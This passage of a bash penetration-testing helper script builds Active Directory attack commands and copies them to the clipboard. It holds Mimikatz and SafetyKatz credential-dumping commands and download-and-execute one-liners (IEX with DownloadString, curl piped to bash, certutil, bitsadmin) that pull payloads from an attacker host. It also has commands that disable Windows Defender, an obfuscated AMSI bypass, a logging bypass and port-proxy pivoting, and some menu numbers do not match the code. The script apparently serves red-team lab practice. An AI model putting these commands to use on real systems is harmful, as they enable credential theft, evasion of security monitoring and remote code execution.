    echo "4. Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'"
    echo "5. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
    echo "6. .\\\\Loader.exe -Path http://<LHOST>:<LPORT>/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
    echo
    echo -n "Choice: "
    read choice

    case $choice in
        1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'";;
        2) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
        3) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
        4) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'";;
        5) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
        6) 
          __ask "For porproxy to localhost use 127.0.0.1"
          nb-vars-set-lhost
          nb-vars-set-lport
          __COMMAND=".\\\\Loader.exe -Path http://${__LHOST}:${__LPORT}/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
          ;;
        7) exit;;
        *) echo "Invalid option"; exit;;
    esac

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-file-download() {
    __warn "If you're not in powershell session and use powershell command, prepend it with powershell -c"
    nb-vars-set-lhost
    nb-vars-set-lport
    local filename && __askvar filename "FILENAME"

    __ask "Do you want to download the file to disk or download and execute it in memory? (d/e)"
    local down && __askvar down "DOWNLOAD_OPTION"

    case $down in
        d)
            # Commands for downloading to disk
            echo
            __ask "Choose a command to copy:"
            echo "1. echo F | xcopy C:\\\\AD\\\\Tools\\\\$filename \\\\<RHOST>\\C$\\\\Users\\\\Public\\\\$filename /Y"
            echo "2. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
            echo "3. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
            echo "4. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
            echo "5. bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
            echo "6. copy \\\\${__RHOST}\\${__SHARE}\\$filename"
            echo "7. Previous menu"
            echo
            echo -n "Choice: "
            read choice

            case $choice in
                1) 
                  echo
                  __ask "Enter the target machine hostname"
                  nb-vars-set-rhost
                  __COMMAND="echo F | xcopy C:\\\\AD\\\\Tools\\\\$filename \\\\\\\\${__RHOST}\\\\C$\\\\Users\\\\Public\\\\$filename /Y"
                  echo
                  ;;
                1) __COMMAND="iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
                2) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
                3) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
                4) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
                5) 
                  echo
                  __ask "Enter the target machine SMB's server IP"
                  nb-vars-set-rhost
                  __check-share
                  __COMMAND="copy \\\\${__RHOST}\\${__SHARE}\\$filename"
                  ;;
                6) exit;;
                *) echo "Invalid option"; exit;;
            esac
            ;;
        e)
            # Commands for downloading and executing in memory
            __ask "Choose a command to copy:"
            echo "1. IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
            echo "2. IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
            echo "3. curl http://${__LHOST}:${__LPORT}/$filename | bash"
            echo "4. Previous menu"
            echo
            echo -n "Choice: "
            read choice

            case $choice in
                1) __COMMAND="IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
                2) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename | bash";;
                3) __COMMAND="IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
                4) exit;;
                *) echo "Invalid option"; exit;;
            esac
            ;;
        *)
            echo "Invalid action choice"; exit;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-psremoting() {
    __check-project
    __ask "Enter the hostname of a target machine"
    nb-vars-set-rhost

    __ask "Do you want to connect or check access to the machine (l/c)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "l" ]]; then
      __COMMAND="Enter-PSSession -ComputerName ${__RHOST}"
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard:"
      __ok "$__COMMAND"
      echo
      __info "Situational awareness:"
      __ok "\$env:username"
      __ok "\$env:computername"
    elif [[ $login == "c" ]]; then
      __COMMAND="Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName ${__RHOST}"
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard:"
      __ok "$__COMMAND"
    else
      echo
      __err "Invalid option. Please choose 'l' for login or 'c' for checking access."
    fi
}

nb-ad-cmd-winrs() {
    __check-project
    __ask "Enter the hostname of a target machine"
    nb-vars-set-rhost

    __ask "Do you want to connect or check access to the machine (l/c)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "l" ]]; then
      __COMMAND="winrs -r:${__RHOST} cmd"
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard:"
      __ok "$__COMMAND"
      echo
      __info "Situational awareness:"
      __ok "set username"
      __ok "set computername"
    elif [[ $login == "c" ]]; then
      __COMMAND="winrs -r:${__RHOST} cmd /c \"set computername && set username\""
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard:"
    else
      echo
      __err "Invalid option. Please choose 'l' for login or 'c' for checking access."
    fi
}

nb-ad-cmd-ping() {
    __ask "Network with subnet ex. 10.0.0.0/23"
    local sb && __askvar sb NETWORK_SUBNET

    __info "Use the following command in windows cmd:"
    __ok "for /L %i in (1 1 254) do ping $sb.%i -n 1 -w 100"
}

nb-ad-pwsh-ping() {
    __ask "Network with subnet ex. 10.0.0.0/23"
    local sb && __askvar sb NETWORK_SUBNET

    __info "Use the following command in windows powershell:"
    __ok "1..254 | % {\"172.16.5.\$(\$_): \$(Test-Connection -count 1 -comp \"$sb\".\$(\$_) -quiet)\"}"
}

nb-ad-pwsh-av-bypass() {
    # Display menu
    __ask "Choose a command to copy:"
    echo "1) Bypass the execution policy"
    echo "2) Disable AV using powershell (Requires Local Admin rights)"
    echo "3) Bypass enhanced script block logging so that AMSI bypass is not logged"
    echo "4) Bypass AMSI Check (If Admin rights are not available)"
    echo "5) Use netsh portproxy from the web server to local on port 8080"
    echo "6) Previous menu"
    echo
    echo -n "Choice: "
    read -r choice

    case $choice in
        1) 
          __COMMAND="powershell -ep Bypass"
          ;;
        2) 
          __COMMAND="Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring \$true
Set-MPPreference -DisableIOAVProtection \$true
Set-MPPreference -DisableIntrusionPreventionSystem \$true"
          ;;
        3)
          # Set LHOST and LPORT variables using existing functions
          nb-vars-set-lhost
          nb-vars-set-lport
          __COMMAND="iex (iwr http://${__LHOST}:${__LPORT}/sbloggingbypass.txt -UseBasicParsing)"
          ;;
        4) 
          __COMMAND="S\`eT-It\`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI\`A\`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A\`ss\`Embly\".\"GET\`TY\`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g\`etf\`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE\`T\`VaLUE\"(  \${n\`ULl},\${t\`RuE} )"
          ;;
        5) 
          nb-vars-set-lhost
          nb-vars-set-lport
          __COMMAND="netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=${__LPORT} connectaddress=${__LHOST}"
          ;;
        6) 
          return
          ;;
        *) 
          echo "Invalid option"
          return
          ;;
    esac

    # Copy the command to clipboard
    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
}
